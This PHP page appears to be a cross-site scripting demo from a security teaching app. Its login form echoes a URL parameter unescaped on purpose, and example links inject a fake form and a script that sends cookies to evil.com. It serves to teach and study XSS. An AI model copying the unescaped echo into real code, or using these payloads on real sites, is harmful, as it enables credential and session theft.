<?php include('../head.php'); ?>

	<h1>Cross Site Scripting (XSS)</h1>
	<p><strong>Sub-types</strong> Reflected, Stored, DOM-based, Cross Site Flashing.</p>
	<div class="row">
		<div class="col-md-8">
			<h2>Reflected XSS</h2>
			<form action="index.php" method="post">
				<div><label>Username <input autocomplete="off" type="text" name="username" class="form-control" value="<?php echo $_GET['user'] ?>"/></label></div>
				<div><label>Password <input autocomplete="off" type="password" name="password" class="form-control"/></label></div>
				<div><button class="btn btn-sm btn-primary" type="submit">Login</button></div>
				<p>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=ben" href="./?user=ben">Example</a>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=&quot;/><img src=&quot;/img/logo.png&quot; width=&quot;100&quot; height=&quot;100&quot; /><span class=&quot;" href="./?user=<?php echo urlencode('"/><img src="/img/logo.png" width="100" height="100" /><span class="') ?>">Reflected 1</a>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=&quot; style=&quot;display:none&quot;/></label></div></form><form action=&quot;http://evil.com/collect.php?&quot;><div><label><input autocomplete=&quot;off&quot; type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; value=&quot;" href="./?user=<?php echo urlencode('" style="display:none"/></label></div></form><form action="http://evil.com/collect.php?"><div><label><input autocomplete="off" type="text" name="username" class="form-control" value="') ?>">Reflected 2</a>
				</p>
				<p>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=&quot;/><script>alert(&quot;foo&quot;);</script><span class=&quot;" href="./?user=<?php echo urlencode('"/><script>alert("foo");</script><span class="') ?>">DOM 1</a>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=&quot;/><script>alert(document.cookie);</script><span class=&quot;" href="./?user=<?php echo urlencode('"/><script>alert(document.cookie);</script><span class="') ?>">DOM 2</a>
					<a class="btn btn-xs btn-default" data-toggle="tooltip" data-placement="right" title="./?user=&quot;/><script>var img=new Image(); img.src=&quot;http://evil.com/collect.php?&quot;+document.cookie;</script><span class=&quot;" href="./?user=<?php echo urlencode('"/><script>var img=new Image(); img.src="http://evil.com/collect.php?"+document.cookie;</script><span class="') ?>">DOM 3</a>
				</p>
				<p>Last request: <code><em><?php echo htmlspecialchars($_GET['user']) ?></em></code></p>
				<p>HTML generated: <code><?php
          echo htmlspecialchars('<div><label>Username <input autocomplete="off" type="text" name="username" class="form-control" value="');
          echo '<em>';
          echo htmlspecialchars($_GET['user']);
          echo '</em>';
          echo htmlspecialchars('"/></label></div>');
        ?></code></p>
			</form>
		</div>
		<div class="col-md-4">
			<h2>XSS: Collection</h2>
      <iframe id="myiframe" src="http://evil.com/collect-read.php" height="auto"></iframe>
			<h2>Others...</h2>
			<ul>
				<li>Stored is when an XSS attack is saved to the DB</li>
				<li>Cross Site Flashing is the embedding of flash attacks instead of DOM-based attacks</li>
			</ul>
		</div>
	</div>
	
<?php include('../foot.php'); ?>
